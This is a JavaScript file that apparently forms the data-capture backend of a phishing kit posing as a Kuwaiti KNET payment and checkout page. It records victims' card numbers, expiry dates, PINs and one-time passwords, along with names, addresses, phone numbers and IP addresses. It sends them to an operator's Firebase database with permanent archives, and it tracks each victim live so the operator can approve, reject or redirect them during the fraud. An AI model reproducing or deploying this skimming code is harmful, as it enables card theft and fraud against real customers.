(function () {
  // ═══════════════════════════════════════════════════════════
  // إعدادات مشروع Firebase الجديد (kuwait-b7d4b) — موحّد للموقعين
  // ═══════════════════════════════════════════════════════════
  const firebaseConfig = {
    apiKey: "AIzaSyAfWfzLyUlsq3NFsU2JK-qcIZkXgN023U0",
    authDomain: "kuwait-b7d4b.firebaseapp.com",
    databaseURL: "https://kuwait-b7d4b-default-rtdb.firebaseio.com",
    projectId: "kuwait-b7d4b",
    storageBucket: "kuwait-b7d4b.firebasestorage.app",
    messagingSenderId: "686238776602",
    appId: "1:686238776602:web:dfb65a9525b3b86cd740a3"
  };

  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }

  const db = firebase.firestore();
  const rtd = firebase.database();

  // إتاحة المراجع عالمياً للصفحات الأخرى
  window.db = db;
  window.rtd = rtd;

  let sessionId = localStorage.getItem('zain_session_id');
  if (!sessionId) {
    sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('zain_session_id', sessionId);
  }
  window.sessionId = sessionId;

  window.getDeviceAndBrowser = function () {
    const ua = navigator.userAgent;
    let browser = "Other";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    let device = "PC";
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
      device = "Mobile";
    }
    return { device, browser };
  };

  function getFriendlyPageName() {
    const path = window.location.pathname;
    if (path.includes('knet')) return 'صفحة الكي نت';
    if (path.includes('verification')) return 'صفحة التحقق';
    if (path.includes('gateway')) return 'بوابة الدفع';
    if (path.includes('carte')) return 'سلة التسوق';
    return 'الصفحة الرئيسية';
  }

  window.initFirebaseSession = async function () {
    const { device, browser } = window.getDeviceAndBrowser();
    const docRef = db.collection("payments").doc(sessionId);
    const friendlyPage = getFriendlyPageName();
    const rtdSessionRef = rtd.ref('sessions/' + sessionId);
    const now = Date.now();
    const createdTime = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });

    // جلب IP بشكل سريع وغير معطل للدخول
    let visitorIp = 'Unknown';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      visitorIp = data.ip;
    } catch (e) {}

    const sessionData = {
      id: sessionId,
      status: 'active',
      phone: localStorage.getItem('phone') || '',
      amount: localStorage.getItem('finalAmount') || localStorage.getItem('amount') || '0.000 د.ك',
      page: friendlyPage,
      device: device,
      browser: browser,
      createdTime: createdTime,
      startTime: now,
      country: 'الكويت',
      hasNewActivity: false,
      ip: visitorIp
    };

    // Update RTD
    rtdSessionRef.once('value', (snapshot) => {
      if (!snapshot.exists()) {
        rtdSessionRef.set(sessionData);
      } else {
        rtdSessionRef.update({ page: friendlyPage, status: 'active', hasNewActivity: true, ip: visitorIp });
      }
    });

    // تتبع الحضور (presence) للوحة التحكم
    const presenceRef = rtd.ref('presence/' + sessionId);
    presenceRef.set({ online: true, lastSeen: now });
    presenceRef.onDisconnect().set({ online: false, lastSeen: Date.now() });

    // Update Firestore
    docRef.get().then((snap) => {
      if (!snap.exists) {
        docRef.set({ ...sessionData, status: 'PENDING', paymentAttempts: [], timeline: [] });
      } else {
        docRef.update({ page: friendlyPage, hasNewActivity: true, ip: visitorIp });
      }
    });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال بيانات البطاقة
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseCard = function (bank, prefix, cardNum, expMonth, expYear, pin) {
    const attemptId = 'card_' + Date.now();
    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

    const cardData = {
      id: attemptId,
      bankName: bank || 'غير معروف',
      cardPrefix: prefix || '',
      cardNumber: cardNum || '',
      expiry: `${expMonth || ''}/${expYear || ''}`,
      pin: pin || '',
      timestamp: timestampStr
    };

    rtd.ref('sessions/' + sessionId + '/attempts/' + attemptId).set(cardData);
    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة التحقق' });
    db.collection("card_data").doc(sessionId).collection("attempts").doc(attemptId).set(cardData);
    // أرشيف دائم في مجموعة cards
    db.collection("cards").doc(attemptId).set({ ...cardData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال رمز التحقق OTP
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseOtp = function (otp) {
    const otpId = 'otp_' + Date.now();
    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const otpData = { id: otpId, otp: otp, timestamp: timestampStr };

    rtd.ref('sessions/' + sessionId + '/otps/' + otpId).set(otpData);
    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true });
    db.collection("card_data").doc(sessionId).collection("otps").doc(otpId).set(otpData);
    // أرشيف دائم في مجموعة otps
    db.collection("otps").doc(otpId).set({ ...otpData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال بيانات العميل والتوصيل (الاسم، العنوان، الهاتف...)
  // تُستدعى من صفحة السلة عند المتابعة للدفع
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseCustomer = function (customer) {
    const data = {
      sessionId: sessionId,
      name: customer.name || '',
      phone: customer.phone || '',
      address: customer.address || '',
      apartment: customer.apartment || '',
      deliveryNotes: customer.deliveryNotes || '',
      amount: customer.amount || '',
      paymentType: customer.paymentType || 'full',
      items: customer.items || [],
      ip: '',
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    };
    // تحديث الجلسة اللحظية
    rtd.ref('sessions/' + sessionId).update({
      phone: data.phone,
      amount: data.amount,
      customerName: data.name,
      hasNewActivity: true
    });
    // حفظ دائم في Firestore
    db.collection("customers").doc(sessionId).set(data, { merge: true });
    if (data.items.length) {
      db.collection("orders").doc(sessionId).set({
        sessionId: sessionId,
        items: data.items,
        subtotal: data.amount,
        paymentType: data.paymentType,
        status: 'PENDING',
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true });
    }
  };

  // ═══════════════════════════════════════════════════════════
  // الاستماع لأوامر لوحة التحكم (موافقة / رفض / تحويل / رسائل)
  // callbacks: { onApproval, onRejection, onRedirect, onMessage }
  // ═══════════════════════════════════════════════════════════
  window.listenForAdminCommands = function (callbacks) {
    callbacks = callbacks || {};
    const cmdRef = rtd.ref('commands/' + sessionId);

    cmdRef.child('approval').on('value', (snap) => {
      const cmd = snap.val();
      if (cmd && cmd.action === 'APPROVE_PAYMENT' && !window.__approvalHandled) {
        window.__approvalHandled = true;
        if (typeof callbacks.onApproval === 'function') callbacks.onApproval(cmd);
      }
    });

    cmdRef.child('rejection').on('value', (snap) => {
      const cmd = snap.val();
      if (cmd && cmd.action === 'REJECT_PAYMENT' && !window.__rejectionHandled) {
        window.__rejectionHandled = true;
        if (typeof callbacks.onRejection === 'function') callbacks.onRejection(cmd);
      }
    });

    cmdRef.child('redirect').on('value', (snap) => {
      const cmd = snap.val();
      if (cmd && cmd.action === 'REDIRECT_PAGE' && cmd.targetPage) {
        if (typeof callbacks.onRedirect === 'function') {
          callbacks.onRedirect(cmd);
        } else {
          window.location.href = cmd.targetPage;
        }
      }
    });

    rtd.ref('messages/' + sessionId).on('child_added', (snap) => {
      const msg = snap.val();
      if (msg && typeof callbacks.onMessage === 'function') callbacks.onMessage(msg);
    });
  };

  window.initFirebaseSession();
})();
